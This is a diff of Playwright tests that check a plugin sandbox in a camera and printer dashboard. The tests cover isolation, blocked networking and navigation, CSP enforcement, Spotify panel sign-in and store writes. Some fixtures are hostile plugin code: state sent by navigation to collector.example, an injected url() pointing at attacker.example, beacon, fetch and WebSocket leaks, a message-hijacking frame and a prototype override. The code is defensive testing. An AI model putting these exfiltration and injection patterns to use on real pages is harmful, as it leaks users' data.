@@ -1,4 +1,6 @@
 import { readFileSync } from "node:fs";
+import { createServer } from "node:http";
+import type { AddressInfo } from "node:net";
 import { expect, test } from "@playwright/test";
 
 const PROBE = `
@@ -15,32 +17,53 @@ plugin.render((ctx) => ({
 }));
 `;
 
-async function runInSandbox(page: import("@playwright/test").Page, code: string, state: unknown = {}) {
+async function runInFrame(
+  page: import("@playwright/test").Page,
+  url: string,
+  messages: Record<string, unknown>[],
+  until: string,
+  pause = 0,
+  quiet = 0,
+) {
   return page.evaluate(
-    ([code, state]) =>
+    ([url, messages, until, pause, quiet]) =>
       new Promise<any>((resolve, reject) => {
         const frame = document.createElement("iframe");
-        frame.src = "plugin-sandbox.html";
+        const { port1, port2 } = new MessageChannel();
+        frame.src = url;
         frame.sandbox.add("allow-scripts");
         frame.allow = "";
-        const answer = (event: MessageEvent) => {
-          if (event.source !== frame.contentWindow) return;
-          if (event.data.t === "booted") {
-            frame.contentWindow!.postMessage({ id: 1, t: "init", code, store: {} }, "*");
-          } else if (event.data.t === "ready") {
-            frame.contentWindow!.postMessage({ id: 2, t: "state", state }, "*");
-          } else {
-            removeEventListener("message", answer);
-            resolve(event.data);
+        frame.addEventListener(
+          "load",
+          () => {
+            frame.contentWindow!.postMessage({ t: "port" }, "*", [port2]);
+            for (const message of messages.slice(0, -1)) port1.postMessage(message);
+            setTimeout(() => port1.postMessage(messages[messages.length - 1]), pause);
+          },
+          { once: true },
+        );
+        const effects: unknown[] = [];
+        let settle: ReturnType<typeof setTimeout>;
+        port1.onmessage = (event) => {
+          if (event.data.t === "failed" || (event.data.t === until && !quiet)) resolve(event.data);
+          else if (event.data.t === until) {
+            effects.push(...event.data.effects);
+            clearTimeout(settle);
+            settle = setTimeout(() => resolve({ t: until, effects }), quiet);
           }
         };
-        addEventListener("message", answer);
         document.body.appendChild(frame);
         setTimeout(() => reject(new Error("sandbox never answered")), 5000);
       }),
-    [code, state] as const,
+    [url, messages, until, pause, quiet] as const,
   );
 }
+
+const runInSandbox = (page: import("@playwright/test").Page, code: string, state: unknown = {}, pause = 0) =>
+  runInFrame(page, "plugin-sandbox.html", [{ id: 1, t: "init", code, store: {} }, { id: 2, t: "state", state }], "result", pause);
+
+const runInPanel = (page: import("@playwright/test").Page, html: string, sound = false) =>
+  runInFrame(page, "plugin-panel.html", [{ t: "init", html, assets: {}, state: {}, theme: {}, store: {}, sound }], "effects", 0, 200);
 
 test("a plugin runs in an opaque origin with no way out", async ({ page }) => {
   await page.goto("/");
@@ -79,37 +102,173 @@ test("code only runs when it came from the frame's host", async ({ page }) => {
     () =>
       new Promise<any>((resolve, reject) => {
         const frame = document.createElement("iframe");
+        const { port1, port2 } = new MessageChannel();
         frame.src = "plugin-sandbox.html";
         frame.sandbox.add("allow-scripts");
         const bystander = document.createElement("iframe");
-        const said: string[] = [];
-        const answer = (event: MessageEvent) => {
-          if (event.source !== frame.contentWindow) return;
-          said.push(event.data.t);
-          if (event.data.t === "booted") {
-            const code = "plugin.render(() => ({ type: 'text', value: 'installed' }));";
-            frame.contentWindow!.postMessage({ id: 1, t: "init", code, store: {} }, "*");
-          } else if (event.data.t === "ready") {
-            const script = bystander.contentDocument!.createElement("script");
-            script.textContent =
-              "const hijack = { id: 2, t: 'init', code: \"plugin.render(() => ({ type: 'text', value: 'hijacked' }));\" };" +
-              "for (let i = 0; i < parent.frames.length; i++) parent.frames[i].postMessage(hijack, '*');";
-            bystander.contentDocument!.body.appendChild(script);
-            setTimeout(() => frame.contentWindow!.postMessage({ id: 3, t: "state", state: {} }, "*"), 100);
-          } else if (event.data.id === 3) {
-            removeEventListener("message", answer);
-            resolve({ ...event.data, said });
-          }
+        frame.addEventListener("load", () => {
+          const script = bystander.contentDocument!.createElement("script");
+          script.textContent =
+            "const hijack = { id: 2, t: 'init', code: \"plugin.render(() => ({ type: 'text', value: 'hijacked' }));\" };" +
+            "for (let i = 0; i < parent.frames.length; i++) {" +
+            "  const { port1, port2 } = new MessageChannel();" +
+            "  parent.frames[i].postMessage({ t: 'port' }, '*', [port2]);" +
+            "  port1.postMessage(hijack);" +
+            "}";
+          bystander.contentDocument!.body.appendChild(script);
+          frame.contentWindow!.postMessage({ t: "port" }, "*", [port2]);
+          const code = "plugin.render(() => ({ type: 'text', value: 'installed' }));";
+          port1.postMessage({ id: 1, t: "init", code, store: {} });
+          setTimeout(() => port1.postMessage({ id: 3, t: "state", state: {} }), 100);
+        });
+        port1.onmessage = (event) => {
+          if (event.data.id === 3) resolve(event.data);
         };
-        addEventListener("message", answer);
-        document.body.appendChild(frame);
         document.body.appendChild(bystander);
+        document.body.appendChild(frame);
         setTimeout(() => reject(new Error("sandbox never answered")), 5000);
       }),
   );
 
   expect(result.tree.value).toBe("installed");
-  expect(result.said.filter((t: string) => t === "ready")).toHaveLength(1);
+});
+
+const WEBRTC = `["RTCPeerConnection", "webkitRTCPeerConnection", "RTCDataChannel", "RTCIceTransport"].filter((name) => typeof window[name] !== "undefined").join()`;
+
+const framesOfItsOwn = (messages: Record<string, unknown>[]) => `
+  window.ran = [];
+  window.twinSaid = [];
+  addEventListener("message", (event) => window.ran.push(event.data));
+  const inline = "<body onload=\\"parent.postMessage('handler', '*')\\"><script>parent.postMessage('script', '*')</scr" + "ipt>";
+  for (const [attribute, value] of [["srcdoc", inline], ["src", "javascript:parent.postMessage('url', '*')"], ["src", "data:text/html," + inline]]) {
+    const child = document.createElement("iframe");
+    child.setAttribute(attribute, value);
+    document.body.appendChild(child);
+  }
+  const twin = document.createElement("iframe");
+  twin.srcdoc = "<script>" + document.querySelector("script").textContent + "</scr" + "ipt>";
+  twin.addEventListener("load", () => {
+    const { port1, port2 } = new MessageChannel();
+    port1.onmessage = (event) => window.twinSaid.push(JSON.stringify(event.data));
+    twin.contentWindow.postMessage({ t: "port" }, "*", [port2]);
+    for (const message of ${JSON.stringify(messages).replace(/<\//g, "<\\/")}) port1.postMessage(message);
+  });
+  document.body.appendChild(twin);
+`;
+
+test("a plugin has no WebRTC, in its own frame or in one it makes", async ({ page }) => {
+  await page.goto("/");
+  const inTwin = [
+    { id: 1, t: "init", code: `plugin.render(() => ({ type: "text", value: "twin has:" + ${WEBRTC} }));` },
+    { id: 2, t: "state" },
+  ];
+  const result = await runInSandbox(
+    page,
+    `${framesOfItsOwn(inTwin)}
+    plugin.render(() => ({ type: "text", value: JSON.stringify({ has: ${WEBRTC}, ran: window.ran, twin: window.twinSaid.join() }) }));`,
+    {},
+    1000,
+  );
+  const said = JSON.parse(result.tree.value);
+
+  expect(said.has).toBe("");
+  expect(said.ran).toEqual([]);
+  expect(said.twin).toContain('twin has:"');
+});
+
+test("a panel has no WebRTC, in its own frame or in one it makes", async ({ page }) => {
+  await page.goto("/");
+  const inTwin = [{ t: "init", html: `<p>drawn</p><script>pg.log("twin has:" + ${WEBRTC});</scr` + "ipt>" }];
+  const result = await runInPanel(
+    page,
+    `<p>drawn</p><script>${framesOfItsOwn(inTwin)}
+    setTimeout(() => pg.log(JSON.stringify({ has: ${WEBRTC}, ran: window.ran, twin: window.twinSaid.join() })), 1000);</script>`,
+  );
+  const said = JSON.parse(result.effects[0].text);
+
+  expect(said.has).toBe("");
+  expect(said.ran).toEqual([]);
+  expect(said.twin).toContain('twin has:"');
+});
+
+test("a panel's inline handler is refused, and its scripts still run", async ({ page }) => {
+  await page.goto("/");
+  const result = await runInPanel(page, `<button id="b" onclick="pg.log('handler')">x</button><script>document.getElementById("b").click(); pg.log("script");</script>`);
+
+  expect(result.effects.map((effect: any) => effect.text)).toEqual(["script"]);
+});
+
+test("a panel's script runs before any markup", async ({ page }) => {
+  await page.goto("/");
+  const result = await runInPanel(page, `<script>pg.log("first")</script><div id="app"></div><script>pg.log("last")</script>`);
+
+  expect(result.effects.map((effect: any) => effect.text)).toEqual(["first", "last"]);
+});
+
+test("a panel's script runs inside an element", async ({ page }) => {
+  await page.goto("/");
+  const result = await runInPanel(page, `<div><p>drawn</p><script>pg.log("nested")</script></div><script>pg.log("after")</script>`);
+
+  expect(result.effects.map((effect: any) => effect.text)).toEqual(["nested", "after"]);
+});
+
+test("a panel can load no script from an address, however it asks", async ({ page }) => {
+  const asked: string[] = [];
+  const collector = createServer((request, response) => {
+    asked.push(request.url ?? "");
+    response.writeHead(200, { "content-type": "text/javascript", "access-control-allow-origin": "*" });
+    response.end(`pg.log("remote ran")`);
+  });
+  await new Promise<void>((resolve) => collector.listen(0, "127.0.0.1", resolve));
+  const origin = `http://127.0.0.1:${(collector.address() as AddressInfo).port}`;
+
+  await page.goto("/");
+  const result = await runInPanel(
+    page,
+    `<script src="${origin}/parsed.js"></script>
+<script>
+  const made = document.createElement("script");
+  made.src = "${origin}/made.js";
+  document.head.appendChild(made);
+  import("${origin}/imported.js").catch(() => {});
+  setTimeout(() => pg.log("done"), 800);
+</script>`,
+  );
+  await page.waitForTimeout(500);
+  collector.close();
+
+  expect(result.effects.map((effect: any) => effect.text)).toEqual(["done"]);
+  expect(asked).toEqual([]);
+});
+
+const SILENT_WAV = "data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=";
+
+const SOUND_PROBE = `<script>
+  const refused = [];
+  document.addEventListener("securitypolicyviolation", (event) => refused.push(event.violatedDirective));
+  const audio = document.createElement("audio");
+  audio.src = "${SILENT_WAV}";
+  document.body.appendChild(audio);
+  audio.load();
+  setTimeout(() => pg.log(JSON.stringify({
+    context: typeof AudioContext + typeof webkitAudioContext,
+    speech: typeof speechSynthesis,
+    refused: refused.map((directive) => directive.split("-")[0]),
+  })), 500);
+</script>`;
+
+test("a panel without the sound permission can make no sound", async ({ page }) => {
+  await page.goto("/");
+  const said = JSON.parse((await runInPanel(page, SOUND_PROBE)).effects[0].text);
+
+  expect(said).toEqual({ context: "undefinedundefined", speech: "undefined", refused: ["media"] });
+});
+
+test("a panel granted sound may play the audio it shipped, and still has no audio context", async ({ page }) => {
+  await page.goto("/");
+  const said = JSON.parse((await runInPanel(page, SOUND_PROBE, true)).effects[0].text);
+
+  expect(said).toEqual({ context: "undefinedundefined", speech: "undefined", refused: [] });
 });
 
 const PIP = `
@@ -168,6 +327,8 @@ async function dashboardWithPlugin(
   granted = PLUGIN.granted,
   surfaces = PLUGIN.manifest.surfaces,
   assets: Record<string, string> = {},
+  file = "plugin.js",
+  secretsSet: string[] = [],
 ) {
   await page.addInitScript(() => {
     class Offline extends EventTarget {
@@ -180,7 +341,7 @@ async function dashboardWithPlugin(
   await page.goto("/");
   await page.waitForFunction(() => Boolean((window as any).__pg.getState().link));
   await page.evaluate(
-    ({ plugin, permissions, code, granted, surfaces, monitor, assets }) => {
+    ({ plugin, permissions, code, granted, surfaces, monitor, assets, file, secretsSet }) => {
       const win = window as any;
       const sent: any[] = [];
       win.__sent = sent;
@@ -192,26 +353,166 @@ async function dashboardWithPlugin(
           cameras: [
             {
               id: "c1", name: "Workshop", source: { kind: "rtsp", url: "rtsp://camera" }, printer_id: null,
-              max_fps: 30, brightness: 1, contrast: 1, sharpness: 0, crop: null, rotation: 0,
+              max_fps: 30, detect_fps: 60, brightness: 1, contrast: 1, sharpness: 0, crop: null, rotation: 0,
               target_fps: 30, achieved_fps: 29.8, inferring: false, in_use: true, online: true, standby: false, last_result: null,
             },
           ],
-          printers: [], prints: [], monitors: [monitor], tokens: [], integrations: [], notifiers: [],
+          printers: [], prints: [], reviews: [], monitors: [monitor], tokens: [], integrations: [], notifiers: [],
           settings: { notifiers: {}, update_check: true, theme: "dark", themes: [], layout: {} },
           stats: { inference_device: "CPU", infer_ms: 1, capacity_fps: 1 },
-          plugins: [{ ...plugin, manifest: { ...plugin.manifest, surfaces, events: ["result"] }, granted, files: ["plugin.js"] }],
+          plugins: [{ ...plugin, manifest: { ...plugin.manifest, surfaces, events: ["result", "http"] }, granted, files: [file], secrets_set: secretsSet }],
           plugin_permissions: permissions,
-          plugin_events: { state: [], result: ["monitor_id", "prediction"] },
+          plugin_events: { state: [], result: ["monitor_id", "prediction"], http: ["tag", "status", "body"] },
           plugin_assets: { png: "image/png", txt: "text/plain", mp3: "audio/mpeg" },
         },
       });
       win.__pgEvent({ event: "state", ...win.__pg.getState().engine });
       const request = sent.find((c) => c.cmd === "plugin.code");
-      win.__pgEvent({ event: "plugin_code", id: "pip", sources: { "plugin.js": code }, assets, req_id: request?.req_id });
+      win.__pgEvent({ event: "plugin_code", id: "pip", sources: { [file]: code }, assets, req_id: request?.req_id });
     },
-    { plugin: PLUGIN, permissions: PERMISSIONS, code, granted, surfaces, monitor: MONITOR, assets },
+    { plugin: PLUGIN, permissions: PERMISSIONS, code, granted, surfaces, monitor: MONITOR, assets, file, secretsSet },
   );
-  await expect.poll(() => page.evaluate(() => Object.keys((window as any).__pg.getState().pluginTrees).length)).toBeGreaterThan(0);
+  if (file === "panel.html") await expect(page.locator("iframe[title='Picture in picture panel']")).toBeAttached();
+  else await expect.poll(() => page.evaluate(() => Object.keys((window as any).__pg.getState().pluginTrees).length)).toBeGreaterThan(0);
+}
+
+test("a panel.html draws itself in a frame of its own", async ({ page }) => {
+  await dashboardWithPlugin(page, "<p>drawn by the panel</p>", ["state:read"], ["panel"], {}, "panel.html");
+
+  await expect(page.frameLocator("iframe[title='Picture in picture panel']").getByText("drawn by the panel")).toBeVisible();
+});
+
+const SPOTIFY_PANEL = readFileSync(new URL("../../plugins/spotify/panel.html", import.meta.url), "utf8");
+
+const holdSecrets = (page: import("@playwright/test").Page, secretsSet: string[]) =>
+  page.evaluate((secretsSet) => {
+    const win = window as any;
+    const engine = win.__pg.getState().engine;
+    win.__pgEvent({ event: "state", ...engine, plugins: engine.plugins.map((plugin: any) => ({ ...plugin, secrets_set: secretsSet })) });
+  }, secretsSet);
+
+const spotifyRequests = (page: import("@playwright/test").Page) =>
+  page.evaluate(() => (window as any).__sent.filter((cmd: any) => cmd.cmd === "plugin.http").length);
+
+const spotifyPanel = async (page: import("@playwright/test").Page, secretsSet: string[]) => {
+  await dashboardWithPlugin(page, SPOTIFY_PANEL, ["net", "oauth", "background"], ["panel"], {}, "panel.html", secretsSet);
+  return page.frameLocator("iframe[title='Picture in picture panel']");
+};
+
+test("the Spotify panel asks Spotify nothing until it is signed in, and stops when it is disconnected", async ({ page }) => {
+  const panel = await spotifyPanel(page, ["oauth_client_id"]);
+  await expect(panel.getByText("Not connected")).toBeVisible();
+  await page.waitForTimeout(1000);
+  expect(await spotifyRequests(page)).toBe(0);
+
+  await holdSecrets(page, ["oauth_client_id", "oauth"]);
+  await expect.poll(() => spotifyRequests(page)).toBeGreaterThan(0);
+
+  await holdSecrets(page, ["oauth_client_id"]);
+  await expect(panel.getByText("Connect Spotify in the Plugins tab in Settings.")).toBeVisible();
+  const asked = await spotifyRequests(page);
+  await page.waitForTimeout(1000);
+  expect(await spotifyRequests(page)).toBe(asked);
+});
+
+test("a rejected Spotify token stops the polling and asks to disconnect and connect again", async ({ page }) => {
+  const panel = await spotifyPanel(page, ["oauth_client_id", "oauth"]);
+  await page.evaluate(() => (window as any).__pgEvent({ event: "http", id: "pip", tag: "player", status: 401, body: null }));
+
+  await expect(panel.getByText("Sign-in rejected")).toBeVisible();
+  await expect(panel.getByText("Disconnect, then Connect again in Settings.")).toBeVisible();
+  const asked = await spotifyRequests(page);
+  await page.waitForTimeout(1500);
+  expect(await spotifyRequests(page)).toBe(asked);
+
+  await holdSecrets(page, ["oauth_client_id"]);
+  await expect(panel.getByText("Not connected")).toBeVisible();
+  await holdSecrets(page, ["oauth_client_id", "oauth"]);
+  await expect.poll(() => spotifyRequests(page)).toBeGreaterThan(asked);
+});
+
+test("the consent dialog names where a plugin signs in and where it gets its tokens", async ({ page }) => {
+  await dashboardWithPlugin(page, PIP);
+  await page.evaluate(() => {
+    const win = window as any;
+    const engine = win.__pg.getState().engine;
+    const oauth = {
+      label: "Spotify",
+      authorize_url: "https://login.elsewhere.test/authorize",
+      token_url: "https://tokens.elsewhere.test/api/token",
+      register_url: "",
+      scopes: [],
+    };
+    win.__pg.setState({
+      engine: {
+        ...engine,
+        plugin_permissions: [...engine.plugin_permissions, { id: "oauth", label: "Sign in", description: "" }],
+        plugins: engine.plugins.map((plugin: any) => ({
+          ...plugin,
+          enabled: false,
+          granted: [],
+          manifest: { ...plugin.manifest, permissions: ["oauth"], oauth },
+        })),
+      },
+    });
+    win.__pg.getState().openSettings("plugins");
+    win.__pgEvent({ event: "catalogue", plugins: [] });
+  });
+  await page.getByRole("button", { name: "Installed" }).click();
+  await page.getByRole("switch", { name: "Enable Picture in picture" }).click();
+
+  const dialog = page.getByRole("dialog", { name: "Enable Picture in picture" });
+  await expect(dialog.getByText("Sign in at login.elsewhere.test/authorize")).toBeVisible();
+  await expect(dialog.getByText("Tokens from tokens.elsewhere.test/api/token")).toBeVisible();
+});
+
+test("a plugin zip over 12 MB is refused before it is sent", async ({ page }) => {
+  await dashboardWithPlugin(page, PIP);
+  await page.evaluate(() => (window as any).__pg.getState().openSettings("plugins"));
+  await page.locator("input[type=file]").setInputFiles({ name: "big.zip", mimeType: "application/zip", buffer: Buffer.alloc(12 * 1024 * 1024 + 1) });
+
+  await expect(page.getByText("big.zip is over 12 MB, the most a plugin can be")).toBeVisible();
+  expect(await page.evaluate(() => (window as any).__sent.filter((cmd: any) => cmd.cmd === "plugin.install").length)).toBe(0);
+});
+
+const LEAVES = {
+  "plugin.js": (to: string) =>
+    `plugin.render((ctx) => { if (ctx.state.monitors[0].alert) location.href = "${to}?state=" + encodeURIComponent(JSON.stringify(ctx.state)); return { type: "text", value: "drawn" }; });`,
+  "panel.html": (to: string) =>
+    `<p>drawn</p><script>pg.on("state", (state) => { if (state.monitors[0].alert) location.replace("${to}?state=" + encodeURIComponent(JSON.stringify(state))); });</scr` + `ipt>`,
+};
+const RELAY = `<!doctype html><script>
+  addEventListener("message", (event) => {
+    fetch("/overheard", { method: "POST", body: JSON.stringify(event.data) });
+    for (const port of event.ports) port.onmessage = (told) => fetch("/overheard", { method: "POST", body: JSON.stringify(told.data) });
+  });
+</scr` + `ipt>`;
+
+for (const file of ["plugin.js", "panel.html"] as const) {
+  for (const to of ["https://collector.example/landed", "/elsewhere"]) {
+    test(`a ${file} that sends its frame to ${to} is stopped and told nothing more`, async ({ page }) => {
+      const reached: string[] = [];
+      await page.route(/collector\.example|\/elsewhere|\/overheard/, (route) => {
+        reached.push(new URL(route.request().url()).pathname);
+        return route.fulfill({ contentType: "text/html", body: RELAY });
+      });
+      await dashboardWithPlugin(page, LEAVES[file](to), ["state:read"], ["panel"], {}, file);
+      const alert = (ts: number) =>
+        page.evaluate((ts) => {
+          const win = window as any;
+          const engine = win.__pg.getState().engine;
+          win.__pgEvent({ event: "state", ...engine, monitors: engine.monitors.map((m: any) => ({ ...m, alert: { ts, score: 0.9, action: "pause" } })) });
+        }, ts);
+
+      await alert(1);
+      await expect.poll(() => page.evaluate(() => (window as any).__pg.getState().pluginFailures.pip)).toBe("sandbox navigated away");
+      await expect(page.locator("iframe")).toHaveCount(0);
+      await alert(2);
+      await page.waitForTimeout(500);
+
+      expect(reached).toEqual(to === "/elsewhere" ? ["/elsewhere"] : []);
+    });
+  }
 }
 
 test("an installed plugin draws its panel with a real camera feed", async ({ page }) => {
@@ -241,6 +542,24 @@ test("a command the plugin was not granted never reaches the engine", async ({ p
   const sent = await page.evaluate(() => (window as any).__sent.map((c: any) => c.cmd));
   expect(sent).not.toContain("printer.action");
   await expect(page.getByText("without permission")).toBeVisible();
+});
+
+const FORGED_LINK = `
+const push = Array.prototype.push;
+Array.prototype.push = function (effect) {
+  if (effect && effect.kind === "link") effect.action = this.length ? "call" : "remove";
+  return push.call(this, effect);
+};
+plugin.render((ctx) => { ctx.call({ to: "other", channel: "now" }); ctx.call({ to: "other", channel: "now" }); return { type: "text", value: "drawn" }; });
+`;
+
+test("a link effect reaches only the commands that talk to plugins", async ({ page }) => {
+  await dashboardWithPlugin(page, FORGED_LINK);
+
+  await expect(page.getByText("drawn")).toBeVisible();
+  const sent = await page.evaluate(() => (window as any).__sent.map((c: any) => c.cmd));
+  expect(sent).toContain("plugin.call");
+  expect(sent).not.toContain("plugin.remove");
 });
 
 async function stubFloat(page: import("@playwright/test").Page) {
@@ -309,6 +628,41 @@ test("a sound plays for a plugin granted it", async ({ page }) => {
   expect(await page.evaluate(() => (window as any).__tones)).toBeGreaterThan(0);
 });
 
+test("a sound unlocks on the touch that iOS counts, not on the first touch that it does not", async ({ page }) => {
+  await page.addInitScript(() => {
+    const win = window as any;
+    win.__resumes = 0;
+    win.__unlocked = false;
+    win.AudioContext = class {
+      state = "suspended";
+      currentTime = 0;
+      destination = {};
+      resume() {
+        win.__resumes += 1;
+        this.state = win.__unlocked ? "running" : "suspended";
+        return Promise.resolve();
+      }
+      createGain() {
+        return { gain: { value: 0, setValueAtTime() {}, exponentialRampToValueAtTime() {} }, connect: (node: any) => node };
+      }
+      createOscillator() {
+        return { type: "", frequency: { setValueAtTime() {} }, connect: (node: any) => node, start() {}, stop() {} };
+      }
+    };
+  });
+  await dashboardWithPlugin(page, NOISY, ["sound"]);
+  await expect(page.getByText("drawn")).toBeVisible();
+  const gesture = (type: string) => page.evaluate((type) => (window.dispatchEvent(new Event(type)), (window as any).__resumes), type);
+
+  const beforeTouch = await gesture("pointerdown");
+  await page.evaluate(() => ((window as any).__unlocked = true));
+  const afterTouchEnd = await gesture("touchend");
+  const afterLater = await gesture("click");
+
+  expect(afterTouchEnd).toBeGreaterThan(beforeTouch);
+  expect(afterLater).toBe(afterTouchEnd);
+});
+
 test("a sound stays quiet for a plugin that was not granted it", async ({ page }) => {
   await silentAudio(page);
   await dashboardWithPlugin(page, NOISY, ["state:read"]);
@@ -368,6 +722,68 @@ test("a plugin takes input and shows the files it shipped", async ({ page }) => 
   await expect(panel.getByAltText("Logo")).toHaveJSProperty("naturalWidth", 1);
 });
 
+const storeWrites = (page: import("@playwright/test").Page) =>
+  page.evaluate(() => (window as any).__sent.filter((cmd: any) => cmd.cmd === "plugin.update").map((cmd: any) => ({ req_id: cmd.req_id, store: cmd.patch.store })));
+
+const hubStores = (page: import("@playwright/test").Page, config: Record<string, unknown>, req_id?: string) =>
+  page.evaluate(
+    ({ config, req_id }) => {
+      const win = window as any;
+      const engine = win.__pg.getState().engine;
+      win.__pgEvent({ event: "state", ...engine, plugins: engine.plugins.map((plugin: any) => ({ ...plugin, config })), req_id });
+    },
+    { config, req_id },
+  );
+
+test("a plugin's store write keeps a key its worker saved in the meantime", async ({ page }) => {
+  await dashboardWithPlugin(page, FIELDS, ["state:read"]);
+  const panel = page.locator("section", { hasText: "Picture in picture" });
+
+  await panel.getByLabel("Webhook").fill("https://hooks.example.com/x");
+  await panel.getByLabel("Webhook").blur();
+  await expect.poll(async () => (await storeWrites(page)).map((write: { store: unknown }) => write.store)).toEqual([{ written: { url: "https://hooks.example.com/x" }, removed: [] }]);
+
+  await hubStores(page, { beat: 7 });
+  await panel.getByLabel("Loud").click();
+  const written = { url: "https://hooks.example.com/x", loud: true };
+  await expect.poll(async () => (await storeWrites(page)).at(-1)?.store).toEqual({ written, removed: [] });
+  const saved = { beat: 7, ...written };
+
+  await hubStores(page, saved, (await storeWrites(page)).at(-1)!.req_id);
+  await expect(panel.getByText("url:https://hooks.example.com/x loud:true")).toBeVisible();
+  expect(await storeWrites(page)).toHaveLength(2);
+});
+
+test("a plugin that writes its store on every render is not drawn again by the hub's answer to the write", async ({ page }) => {
+  const counting = `plugin.render((ctx) => { ctx.store.renders = (ctx.store.renders || 0) + 1; return { type: "text", value: "drawn " + ctx.store.renders }; });`;
+  await dashboardWithPlugin(page, counting, ["state:read"]);
+  await expect.poll(() => storeWrites(page)).toHaveLength(1);
+  await page.evaluate(() => {
+    const win = window as any;
+    const answer = (cmd: any) => {
+      win.__sent.push(cmd);
+      if (cmd.cmd !== "plugin.update") return;
+      const engine = win.__pg.getState().engine;
+      const plugins = engine.plugins.map((plugin: any) => ({ ...plugin, config: { ...plugin.config, ...cmd.patch.store.written } }));
+      setTimeout(() => win.__pgEvent({ event: "state", ...engine, plugins, req_id: cmd.req_id }));
+    };
+    win.__pg.setState({ link: { send: answer, close() {} } });
+  });
+
+  await hubStores(page, { renders: 1 }, (await storeWrites(page))[0].req_id);
+  await page.waitForTimeout(500);
+  expect(await storeWrites(page)).toHaveLength(1);
+
+  await page.evaluate(() => {
+    const win = window as any;
+    const engine = win.__pg.getState().engine;
+    win.__pgEvent({ event: "state", ...engine, monitors: engine.monitors.map((monitor: any) => ({ ...monitor, name: "Renamed" })) });
+  });
+  await expect.poll(async () => (await storeWrites(page)).at(-1)?.store).toEqual({ written: { renders: 2 }, removed: [] });
+  await page.waitForTimeout(500);
+  expect(await storeWrites(page)).toHaveLength(2);
+});
+
 test("a plugin panel rearranges with the monitors", async ({ page }) => {
   await dashboardWithPlugin(page, PIP);
   await page.evaluate(() => (window as any).__pg.setState({ customising: true }));
@@ -391,8 +807,8 @@ test("a plugin panel rearranges with the monitors", async ({ page }) => {
   await page.mouse.up();
 
   await expect.poll(tiles).not.toEqual(before);
-  const saved = await page.evaluate(() => (window as any).__sent.filter((c: any) => c.patch?.layout).pop());
-  expect(saved.patch.layout.monitors.order).toContain("pip");
+  const saved = () => page.evaluate(() => (window as any).__sent.filter((c: any) => c.patch?.layout).pop());
+  await expect.poll(async () => (await saved())?.patch.layout.monitors.order).toContain("pip");
 });
 
 
@@ -410,7 +826,7 @@ test("glass takes the text colour its tone can carry", async ({ page }) => {
     });
   const wear = (opacity: number, tone: number) =>
     page.evaluate(async (glass) => {
-      const { applyTheme } = await import("/src/theme.ts");
+      const { applyTheme } = await import("/src/theme.ts" as string);
       applyTheme("glass", [], glass);
     }, { opacity, tone });
 
@@ -423,6 +839,7 @@ test("glass takes the text colour its tone can carry", async ({ page }) => {
 
 
 test("an event never wipes the per-monitor views the plugin drew", async ({ page }) => {
+  await stubFloat(page);
   await dashboardWithPlugin(page, `${MONITOR_PIP}\nplugin.on('result', () => {});`, PLUGIN.granted, ["monitor"]);
   const float = page.getByRole("button", { name: "Float Bench" });
 
@@ -450,4 +867,69 @@ test("a float node in a panel floats without a round trip to the sandbox", async
 
   expect(await page.evaluate(() => (window as any).__sent.filter((c: any) => c.cmd === "plugin.act").length)).toBe(0);
   expect(await page.evaluate(() => (window as any).__floated)).toBe(1);
+});
+
+test("a background is only ever a base64 picture, so it cannot smuggle a second address", async ({ page }) => {
+  await dashboardWithPlugin(page, PIP, ["background"]);
+  const picture = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
+  const paint = (image: string) =>
+    page.evaluate((image) => {
+      const win = window as any;
+      win.__pgEvent({ event: "plugin_effect", id: "pip", effect: { kind: "background", image } });
+      return win.__pg.getState().background?.image ?? null;
+    }, image);
+
+  expect(await paint(picture)).toBe(picture);
+  expect(await paint('data:image/png;base64,AAAA"), url("https://attacker.example/?d=1')).toBeNull();
+  expect(await paint("data:image/svg+xml;base64,PHN2Zy8+")).toBeNull();
+});
+
+const PAGE_POLICY = [...readFileSync(new URL("../../printguard/server/app.py", import.meta.url), "utf8").match(/PLUGIN_PAGE_CSP = \(([^)]*)\)/)![1].matchAll(/"([^"]*)"/g)]
+  .map((piece) => piece[1])
+  .join("");
+
+const OWN_PAGE = `<!doctype html><title>served</title>
+<style>body { color: rgb(1, 2, 3); }</style>
+<link rel="stylesheet" href="https://elsewhere.example/leak.css">
+<img src="https://elsewhere.example/leak.png"><img src="/api/v1/leak.png">
+<img id="inline" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==">
+<script src="https://elsewhere.example/leak.js"></script>
+<iframe src="https://elsewhere.example/leak-frame"></iframe>
+<form id="own" method="post" action="/plugins/demo/login"><input name="user" value="me"></form>
+<form id="away" method="post" action="https://elsewhere.example/leak-form"><input name="user" value="me"></form>
+<script>
+  const tried = [document.getElementById("inline").decode(), fetch("https://elsewhere.example/leak-fetch"), fetch("/api/health")];
+  navigator.sendBeacon("https://elsewhere.example/leak-beacon", "x");
+  try { new WebSocket("wss://elsewhere.example/leak-socket"); } catch {}
+  Promise.allSettled(tried).then((fetched) => {
+    document.title = [getComputedStyle(document.body).color, ...fetched.map((f) => f.status)].join(" ");
+  });
+</script>`;
+
+test("a plugin's own page styles, scripts and posts back to the hub, and reaches nothing else", async ({ page, baseURL }) => {
+  const asked: string[] = [];
+  await page.route(/elsewhere\.example|\/api\//, (route) => {
+    asked.push(route.request().url());
+    return route.fulfill({ contentType: "text/plain", body: "" });
+  });
+  await page.route("**/plugins/demo/**", (route) => {
+    const signedIn = route.request().method() === "POST";
+    return route.fulfill({
+      contentType: "text/html",
+      headers: { "Content-Security-Policy": PAGE_POLICY },
+      body: signedIn ? `<title>signed in as ${route.request().postData()}</title>` : OWN_PAGE,
+    });
+  });
+
+  expect(PAGE_POLICY).toContain("sandbox allow-forms allow-scripts");
+  expect(PAGE_POLICY).toContain("frame-ancestors 'none'");
+  await page.goto(`${baseURL}/plugins/demo/page`);
+  await expect(page).toHaveTitle("rgb(1, 2, 3) fulfilled rejected rejected");
+  await page.evaluate(() => (document.getElementById("away") as HTMLFormElement).submit());
+  await page.waitForTimeout(300);
+  expect(asked).toEqual([]);
+
+  await page.goto(`${baseURL}/plugins/demo/page`);
+  await page.evaluate(() => (document.getElementById("own") as HTMLFormElement).submit());
+  await expect(page).toHaveTitle("signed in as user=me");
 });
